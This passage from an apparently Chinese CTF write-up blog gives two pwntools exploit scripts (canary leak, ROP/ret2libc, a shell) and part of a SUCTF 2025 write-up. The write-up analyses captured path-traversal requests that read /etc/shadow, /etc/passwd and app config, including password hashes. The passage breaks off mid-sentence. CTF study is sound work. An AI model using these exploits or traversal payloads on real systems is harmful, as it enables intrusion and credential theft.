class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn3&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">48321</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401402</span><br>pop_rdi = <span class="hljs-number">0x4014c3</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(<span class="hljs-string">b&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="宇宙射线"><a href="#宇宙射线" class="headerlink" title="宇宙射线"></a>宇宙射线</h2><p>没做出来，复现一下</p><p>main 函数，打开了一个&#x2F;proc&#x2F;self&#x2F;mem 文件，通过该文件，可以读取或写入进程的内存。第一个输入提示用户输入一个十六进制格式的内存地址，然后&#x2F;proc&#x2F;self&#x2F;mem 文件会根据输入的内存地址进行修改。这里我们还可以注意到，&#x2F;proc&#x2F;self&#x2F;mem 文件关闭后有一个 sys_exit 的系统调用</p><img src="/post/2004/1737214753133-7b127ee4-5ab9-43f0-8f99-f5bf328f47dc.png" class="" title="img"><img src="/post/2004/1737215596633-ad054702-4694-441c-b7a3-5f86f8f72437.png" class="" title="img"><p>查看其汇编代码，将 mov rax, 3Ch 改成 mov rax, 0 就是可以系统调用 read，从而进行溢出</p><img src="/post/2004/1737214157215-93558cf3-46e7-4e3c-b564-dedda940a747.png" class="" title="img"><p>查找 gadget 的时候，并没有发现 rdi 的 gadget 的，不过 key 函数给出了一段 gadget，通过这段 gadget 可以控制 rdi</p><img src="/post/2004/1737213992448-e8191d83-a2a4-4b02-a964-fb86d26f709e.png" class="" title="img"><p>总的来说，我们需要通过&#x2F;proc&#x2F;self&#x2F;mem 文件将代码段的 sys_exit 系统调用改为 read，实际上就是两次输入，第一次输入地址从而找到修改点，第二次输入 0 将 3Ch 改成 0 即可实现 mov rax 0； 有了溢出点之后打 ret2libc 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;101.43.67.25&#x27;</span>, <span class="hljs-number">8090</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401309</span><br>mov_rdi_rbp_pop_rbp = <span class="hljs-number">0x40129E</span><br>pop_rbp = <span class="hljs-number">0x4012A2</span><br>ret = <span class="hljs-number">0x40101a</span><br><br><span class="hljs-comment"># attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;Enter the coordinates of the cosmic rays:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x40155F</span>+<span class="hljs-number">3</span>).encode())<br>p.recvuntil(<span class="hljs-string">&quot;Enter the data sent:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0x0&#x27;</span>)<span class="hljs-comment">#rax -&gt; 0</span><br><br><span class="hljs-comment"># attach(p)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x12</span>+<span class="hljs-number">8</span>) + p64(pop_rbp) + p64(puts_got)<br>payload += p64(mov_rdi_rbp_pop_rbp) + p64(<span class="hljs-number">0x0</span>) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)))<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter the coordinates of the cosmic rays:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x40155F</span>+<span class="hljs-number">3</span>).encode())<br>p.recvuntil(<span class="hljs-string">&quot;Enter the data sent:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0x0&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x12</span>+<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF 2025</title>
    <link href="/post/23605.html"/>
    <url>/post/23605.html</url>
    
    <content type="html"><![CDATA[<p>SU_checkin和SU_BBRE这两题都出了大半，但还是差了点，参考wp来复现一下，Pwn题等有时间也复现一下。</p><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SU-RealCheckin"><a href="#SU-RealCheckin" class="headerlink" title="SU_RealCheckin"></a>SU_RealCheckin</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hello ctf -&gt; 🏠 🦅🍋🍋🍊 🐈🌮🍟<br><br><span class="hljs-variable">$flag</span> -&gt; 🐍☂️🐈🌮🍟&#123;🐋🦅🍋🐈🍊🏔️🦅<span class="hljs-literal">_</span>🌮🍊<span class="hljs-literal">_</span>🐍☂️🐈🌮🍟<span class="hljs-literal">_</span>🧶🍊☂️<span class="hljs-literal">_</span>🐈🍎🌃<span class="hljs-literal">_</span>🌈🦅🍎🍋🍋🧶<span class="hljs-literal">_</span>🐬🍎🌃🐈🦅&#125;<br></code></pre></td></tr></table></figure><p>仔细观察发现 flag 是每个图标的首字母</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean">🐍-&gt;snake   -&gt;s<br>☂️-&gt;umbrella-&gt;u<br>🐈-&gt;cat     -&gt;c<br>🌮-&gt;taco    -&gt;t<br>🍟-&gt;fry     -&gt;f<br>🐋-&gt;whale   -&gt;w<br>🦅-&gt;eagel   -&gt;e<br>🍋-&gt;lemon   -&gt;l<br>...<br>🍊-&gt;orange  -&gt;o<br>🏔️-&gt;mountain-&gt;m<br>...<br>🧶-&gt;yarn    -&gt;y<br>...<br>🍎-&gt;apple   -&gt;a<br>🌃-&gt;night   -&gt;n<br>...<br>🌈-&gt;rainbow -&gt;r<br>...<br>🐬-&gt;dolphin -&gt;d<br><br>suctf&#123;welcome_to_suctf_you_can_really_dance&#125;<br></code></pre></td></tr></table></figure><h3 id="SU-checkin"><a href="#SU-checkin" class="headerlink" title="SU_checkin"></a>SU_checkin</h3><p>流量分析，直接搜索 flag，追踪一下就可以发现信息</p><img src="/post/23605/1736861813849-405cfc67-fc71-4729-a694-9a463e5ee69e.png" class="" title="img"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /download?filename=../../../../../../../../../root/flag.txt HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/flag.txt&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 7<br>Date: Thu, 09 Jan 2025 06:59:21 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>nonono<br>GET /download?filename=../../../../../../../../../proc/self/cmdline HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cmdline&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 65<br>Date: Thu, 09 Jan 2025 06:59:26 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>java.-jar.suctf-0.0.1-SNAPSHOT.jar.--password=SePassWordLen23SUCTGET /download?filename=../../../../../../../../../root/start.sh HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/start.sh&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 1<br>Date: Thu, 09 Jan 2025 06:59:32 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br><br>GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 27<br>Date: Thu, 09 Jan 2025 06:59:38 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>algorithm=PBEWithMD5AndDES<br>GET /download?filename=../../../../../../../../../etc/shadow HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/shadow&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 909<br>Date: Thu, 09 Jan 2025 06:59:43 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>root:$6$MI.uuGSS7qKn4rEK$NlYB/kaAeRmd3CYY4mxDuMMMh1PzQZHTEL.BV3Dosp.15kD3MgSDzqbYRRazeglIRVAfe6ATwRZ9ekSwNTkit0:20077:0:99999:7:::<br>daemon:*:20007:0:99999:7:::<br>bin:*:20007:0:99999:7:::<br>sys:*:20007:0:99999:7:::<br>sync:*:20007:0:99999:7:::<br>games:*:20007:0:99999:7:::<br>man:*:20007:0:99999:7:::<br>lp:*:20007:0:99999:7:::<br>mail:*:20007:0:99999:7:::<br>news:*:20007:0:99999:7:::<br>uucp:*:20007:0:99999:7:::<br>proxy:*:20007:0:99999:7:::<br>www-data:*:20007:0:99999:7:::<br>backup:*:20007:0:99999:7:::<br>list:*:20007:0:99999:7:::<br>irc:*:20007:0:99999:7:::<br>gnats:*:20007:0:99999:7:::<br>nobody:*:20007:0:99999:7:::<br>_apt:*:20007:0:99999:7:::<br>systemd-timesync:*:20077:0:99999:7:::<br>systemd-network:*:20077:0:99999:7:::<br>systemd-resolve:*:20077:0:99999:7:::<br>messagebus:*:20077:0:99999:7:::<br>sshd:*:20077:0:99999:7:::<br>hacker:$6$rzdplO02wm/607Io$v9gjdKBiuEdA0F28qx1REs/L4Qo9dqBQD.fUUjans5qn/sWOjSffHWzlMvgwzxHyyrfSA8kLilzMMRGhRNHLk0:20077:0:99999:7:::<br>GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 133<br>Date: Thu, 09 Jan 2025 06:59:47 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>spring.application.name=suctf<br>server.port = 8888<br>OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=<br>GET /download?filename=../../../../../../../../../etc/passwd HTTP/1.1<br>Host: 192.168.58.128<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br><br>HTTP/1.1 200 <br>Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/passwd&quot;<br>Content-Type: application/octet-stream<br>Content-Length: 1322<br>Date: Thu, 09 Jan 2025 06:59:53 GMT<br>Keep-Alive: timeout=60<br>Connection: keep-alive<br><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:104:106::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>hacker:x:1000:1000::/home/hacker:/bin/bash<br></code></pre></td></tr></table></figure><p>综合一下，有一个 flag.txt，但是没有 flag；还有一个 hint 是PBEWithMD5AndDES 算法，密文和密码也可看出来，密文是 OUTPUT 的内容，密码在 cmdline 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=<br>password=SePassWordLen23SUCT<br><br>algorithm=PBEWithMD5AndDES<br></code></pre></td></tr></table></figure><p>当时想着是PBEWithMD5AndDES 